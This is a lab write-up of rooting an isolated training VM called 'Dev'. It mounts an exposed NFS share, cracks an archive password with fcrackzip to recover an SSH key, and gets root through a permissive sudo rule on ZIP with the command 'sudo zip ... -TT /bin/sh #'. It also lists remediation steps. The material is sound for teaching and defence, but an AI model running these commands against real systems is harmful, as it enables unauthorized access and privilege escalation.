LAB WRITEUP · LINUX

Dev

I investigated how an exposed NFS archive and a permissive sudo rule connected file access to privileged command execution on Dev.

Target environment

  • Target: Dev
  • Operating system: Linux; distribution not recorded in the selected evidence
  • Architecture: x86_64 (64-bit)
  • Service / application: NFS and SSH; local ZIP utility
  • Weakness investigated: Exposed encrypted archive containing a private key and unrestricted sudo ZIP execution
  • Scope: Intentionally vulnerable, isolated training VM

1. Enumerate and mount the NFS export

The export listing shows /srv/nfs available to broad private network ranges, so I checked what it held.

Placeholders such as <TARGET_IP> stand in for lab addresses.

showmount -e <TARGET_IP>

I mounted the export on Kali and inspected its contents.

sudo mkdir -p /mnt/dev
sudo mount -t nfs <TARGET_IP>:/srv/nfs /mnt/dev
ls -la /mnt/dev

2. Recover the encrypted archive

The share held save.zip. I ran an offline wordlist attack against it, then extracted it. The extraction capture shows id_rsa and todo.txt; the cracking capture shows the recovered password and is excluded.

fcrackzip -v -u -D \
  -p /usr/share/wordlists/rockyou.txt \
  save.zip
unzip save.zip

The archive password only unlocked the archive, not SSH; the private key inside was a separate way in. Archive encryption did not make up for putting reusable authentication material on an accessible share.

3. Establish the local account context

My reporting page describes logging in with the key after password authentication failed, using this template; user is a placeholder, not a verified account name.

chmod 600 id_rsa
ssh -i id_rsa user@<TARGET_IP>

Later captures show a shell as jeanpaul on Dev. The exact login command wasn't saved, and the private key is not reproduced.

4. Inspect the sudo boundary

I checked the account’s sudo rights: it could run ZIP as root without a password.

sudo -l

ZIP’s archive testing option accepts an external command, so unrestricted sudo access to ZIP also grants that command execution.

5. Invoke ZIP’s external test command

I created a temporary archive and supplied a shell as its external test command:

sudo zip /tmp/shell.zip /etc/hosts -T -TT '/bin/sh #'

-T tests the archive and -TT sets the test command. Because sudo runs ZIP as root, the shell runs as root; the trailing # keeps the appended archive argument out of the shell command. See the GTFOBins ZIP reference.

6. Result and evidence limits

The capture shows whoami returning root and hostname returning dev right after the sudo ZIP command.

whoami
hostname

The exact SSH login command was not saved, and credential-bearing captures are excluded. No remediation retest is claimed.

7. Attack path

  1. NFS export
  2. Encrypted archive
  3. Offline password recovery
  4. SSH key access (documented; login command not retained)
  5. Local shell as jeanpaul
  6. Sudo ZIP external command
  7. Root

8. Findings and remediation

Attack / finding

Exposed NFS archive

A reachable export disclosed an encrypted archive holding authentication material.

Recommended defensive action

Restrict exports to required clients and identities, remove secrets from shares and review filesystem permissions.

Attack / finding

Recoverable credentials

An offline wordlist attack recovered the archive password, exposing a private key.

Recommended defensive action

Revoke and replace the exposed key, remove its copies, use appropriate secret storage and avoid relying on archive passwords as an access boundary.

Attack / finding

Privileged utility execution

The sudo rule allowed ZIP’s external command feature to launch a root shell.

Recommended defensive action

Remove unrestricted sudo access to ZIP. If privileged archiving is needed, allow only a narrow operation that cannot choose arbitrary commands or privileged paths. Audit other sudo rules for the same problem. No remediation validation was performed.
